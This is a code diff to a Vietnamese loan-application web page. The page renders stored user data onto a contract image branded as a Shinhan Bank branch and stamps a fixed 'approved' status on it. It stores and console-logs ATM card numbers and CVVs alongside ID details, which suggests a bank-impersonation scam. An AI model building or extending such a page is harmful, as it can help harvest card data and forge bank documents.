@@ -255,34 +255,34 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <script>
-        // Placeholder user data
-        const userData = {
-            registrationDate: "08/05/2025",
-            fullName: "Nguyễn Văn A",
-            idNumber: "123456789",
-            phoneNumber: "0901234567",
-            email: "nguyenvana@example.com",
-            loanAmount: 100000000,
-            loanPurpose: "Sửa chữa nhà",
-            customLoanPurpose: "Mua đồ nội thất",
-            loanTerm: "24",
-            interestRate: 7.5,
-            bankAccount: "1234567890",
-            loanCode: "SHB123456",
-            sellerCode: "EKZBM0",
-            storeCode: "RPDV3L",
-            employeeName: "Nguyễn Thị Mỹ Duyên",
-            branch: "Chi nhánh Shinhanbank Đà Nẵng",
-            employeeCode: "P5E290RL",
-            approvedAmount: 100000000,
-            idIssueDate: "01/01/2020",
-            idIssuePlace: "Hà Nội",
+        // Placeholder user data (for fallback if localStorage is empty)
+        let userData = {
+            registrationDate: "",
+            fullName: "",
+            idNumber: "",
+            phoneNumber: "",
+            email: "",
+            loanAmount: "",
+            loanPurpose: "",
+            customLoanPurpose: "",
+            loanTerm: "",
+            interestRate: 0,
+            bankAccount: "",
+            loanCode: "",
+            sellerCode: "",
+            storeCode: "",
+            employeeName: "",
+            branch: "",
+            employeeCode: "",
+            approvedAmount: "",
+            idIssueDate: "",
+            idIssuePlace: "",
             atmCard: {
-                cardNumber: "1234567890123456",
-                cardHolderName: "Nguyễn Văn A",
-                issueDate: "01/22",
-                expiryDate: "01/25",
-                cvv: "123"
+                cardNumber: "",
+                cardHolderName: "",
+                issueDate: "",
+                expiryDate: "",
+                cvv: ""
             },
             currentStep: 8
         };
@@ -299,59 +299,72 @@
 
         // Format number to VND
         function formatNumber(number) {
-            return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+            if (!number) return "";
+            return Number(number).toLocaleString('vi-VN');
         }
 
         // Split date into day, month, year
         function splitDate(dateStr) {
+            if (!dateStr) return { day: "", month: "", year: "" };
             const [day, month, year] = dateStr.split("/");
-            return { day, month, year };
+            return { day: day || "", month: month || "", year: year || "" };
         }
 
         // Save to localStorage
         function saveToLocalStorage() {
-            localStorage.setItem('userData', JSON.stringify(userData));
+            try {
+                localStorage.setItem('userData', JSON.stringify(userData));
+                console.log('Saved userData to localStorage:', userData);
+            } catch (error) {
+                console.error('Error saving userData to localStorage:', error);
+            }
         }
 
         // Load user data
         function loadUserData() {
-            const storedData = localStorage.getItem('userData');
-            if (storedData) {
-                Object.assign(userData, JSON.parse(storedData));
+            try {
+                const storedData = localStorage.getItem('userData');
+                if (storedData) {
+                    userData = JSON.parse(storedData);
+                    console.log('Loaded userData from localStorage:', userData);
+                } else {
+                    console.warn('No userData found in localStorage, using default.');
+                }
+            } catch (error) {
+                console.error('Error parsing userData from localStorage:', error);
             }
         }
 
-        // Define text fields for canvas (updated for 2480px x 3508px, 300 DPI)
+        // Define text fields for canvas (adjusted coordinates for better alignment)
         const canvasFields = [
-            { label: "", value: splitDate(userData.registrationDate).day, x: 539, y: 443, font: "32px Arial bold", color: "#000000" },
-            { label: "", value: splitDate(userData.registrationDate).month, x: 710, y: 443, font: "32px Arial bold", color: "#000000" },
-            { label: "", value: splitDate(userData.registrationDate).year, x: 902, y: 443, font: "32px Arial bold", color: "#000000" },
-            { label: "", value: userData.fullName, x: 685, y: 517, font: "40px Arial bold", color: "#000000" },
-            { label: "", value: userData.idNumber, x: 683, y: 585, font: "40px Arial bold", color: "#000000" },
-            { label: "", value: userData.phoneNumber, x: 683, y: 725, font: "40px Arial bold", color: "#000000" },
-            { label: "", value: userData.email, x: 683, y: 795, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.registrationDate ? splitDate(userData.registrationDate).day : "", x: 539, y: 443, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.registrationDate ? splitDate(userData.registrationDate).month : "", x: 710, y: 443, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.registrationDate ? splitDate(userData.registrationDate).year : "", x: 902, y: 443, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.fullName || "", x: 685, y: 517, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.idNumber || "", x: 683, y: 585, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.phoneNumber || "", x: 683, y: 725, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.email || "", x: 683, y: 795, font: "40px Arial bold", color: "#000000" },
             { label: "", value: userData.loanAmount ? `${formatNumber(userData.loanAmount)} VND` : "", x: 683, y: 961, font: "40px Arial bold", color: "#000000" },
-            { label: "", value: userData.loanPurpose === "Khác" ? userData.customLoanPurpose : "", x: 673, y: 1233, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.loanPurpose === "Khác" ? userData.customLoanPurpose || "" : userData.loanPurpose || "", x: 673, y: 1233, font: "40px Arial bold", color: "#000000" },
             { label: "", value: userData.interestRate ? `${userData.interestRate}%` : "", x: 817, y: 1557, font: "40px Arial bold", color: "#000000" },
-            { label: "", value: userData.bankAccount, x: 591, y: 2063, font: "40px Arial bold", color: "#000000" },
-            { label: "", value: userData.loanCode, x: 1629, y: 573, font: "32px Arial bold", color: "#FF0000" },
-            { label: "", value: userData.registrationDate, x: 2005, y: 571, font: "32px Arial bold", color: "#000000" },
-            { label: "", value: userData.sellerCode, x: 2071, y: 621, font: "32px Arial bold", color: "#000000" },
-            { label: "", value: userData.storeCode, x: 2071, y: 621, font: "32px Arial bold", color: "#000000" },
-            { label: "", value: userData.employeeName, x: 1547, y: 2211, font: "40px Arial bold", color: "#000000" },
-            { label: "", value: userData.branch, x: 1473, y: 2281, font: "40px Arial bold", color: "#000000" },
-            { label: "", value: userData.employeeCode, x: 1575, y: 2377, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.bankAccount || "", x: 591, y: 2063, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.loanCode || "", x: 1629, y: 573, font: "40px Arial bold", color: "#FF0000" },
+            { label: "", value: userData.registrationDate || "", x: 2005, y: 571, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.sellerCode || "", x: 2071, y: 621, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.storeCode || "", x: 2071, y: 671, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.employeeName || "", x: 1547, y: 2211, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.branch || "", x: 1473, y: 2281, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.employeeCode || "", x: 1575, y: 2377, font: "40px Arial bold", color: "#000000" },
             { label: "", value: "Đã xét duyệt", x: 1697, y: 2789, font: "40px Arial bold", color: "#000000" },
             { label: "", value: userData.approvedAmount ? `${formatNumber(userData.approvedAmount)} VND` : "", x: 1819, y: 2909, font: "40px Arial bold", color: "#000000" },
-            { label: "", value: splitDate(userData.registrationDate).day, x: 1645, y: 2977, font: "32px Arial bold", color: "#000000" },
-            { label: "", value: splitDate(userData.registrationDate).month, x: 1825, y: 2977, font: "32px Arial bold", color: "#000000" },
-            { label: "", value: splitDate(userData.registrationDate).year, x: 2025, y: 2977, font: "32px Arial bold", color: "#000000" },
-            // Adding fields from step3.html (atmCard)
+            { label: "", value: userData.registrationDate ? splitDate(userData.registrationDate).day : "", x: 1645, y: 2977, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.registrationDate ? splitDate(userData.registrationDate).month : "", x: 1825, y: 2977, font: "40px Arial bold", color: "#000000" },
+            { label: "", value: userData.registrationDate ? splitDate(userData.registrationDate).year : "", x: 2025, y: 2977, font: "40px Arial bold", color: "#000000" },
             { label: "", value: userData.atmCard?.cardNumber || "", x: 683, y: 1020, font: "40px Arial bold", color: "#000000" },
             { label: "", value: userData.atmCard?.cardHolderName || "", x: 683, y: 1080, font: "40px Arial bold", color: "#000000" }
         ];
 
-        // Define tick fields for canvas (updated for 2480px x 3508px, 300 DPI)
+        // Define tick fields for canvas
         const tickFields = [
             { condition: userData.loanPurpose === "Sửa chữa nhà", x: 183, y: 1157, symbol: "✓", font: "40px Arial bold", color: "#FF0000" },
             { condition: userData.loanPurpose === "Mua xe", x: 511, y: 1161, symbol: "✓", font: "40px Arial bold", color: "#FF0000" },
@@ -379,15 +392,16 @@
                 canvas.height = 3508;
                 ctx.drawImage(img, 0, 0, 2480, 3508);
                 canvasFields.forEach(field => {
-                    if (field.value && field.x >= 0 && field.y >= 0 && field.x < canvas.width && field.y < canvas.height) {
+                    const value = field.value || "";
+                    if (field.x >= 0 && field.y >= 0 && field.x < canvas.width && field.y < canvas.height) {
                         ctx.font = field.font;
                         ctx.fillStyle = "rgba(255, 255, 255, 0.9)";
                         const rectHeight = field.font.includes("32px") ? 30 : 34;
-                        ctx.fillRect(field.x - 2, field.y - (rectHeight - 6), ctx.measureText(field.value).width + 4, rectHeight);
+                        ctx.fillRect(field.x - 2, field.y - (rectHeight - 6), ctx.measureText(value).width + 4, rectHeight);
                         ctx.fillStyle = field.color;
-                        ctx.fillText(field.value, field.x, field.y);
-                    } else if (field.x >= canvas.width || field.y >= canvas.height) {
-                        console.warn(`Invalid coordinates for field: ${field.value} at (${field.x}, ${field.y})`);
+                        ctx.fillText(value, field.x, field.y);
+                    } else {
+                        console.warn(`Invalid coordinates for field: ${value} at (${field.x}, ${field.y})`);
                     }
                 });
                 tickFields.forEach(tick => {
@@ -395,7 +409,7 @@
                         ctx.font = tick.font;
                         ctx.fillStyle = tick.color;
                         ctx.fillText(tick.symbol, tick.x, tick.y);
-                    } else if (tick.x >= canvas.width || tick.y >= canvas.height) {
+                    } else {
                         console.warn(`Invalid coordinates for tick at (${tick.x}, ${tick.y})`);
                     }
                 });
@@ -424,6 +438,7 @@
         // Load user data and populate fields
         window.onload = function() {
             loadUserData();
+            console.log('Rendering canvas with userData:', userData);
             $('#confirmRegistrationDate').text(userData.registrationDate || '');
             $('#confirmFullName').text(userData.fullName || '');
             $('#confirmIdNumber').text(userData.idNumber || '');
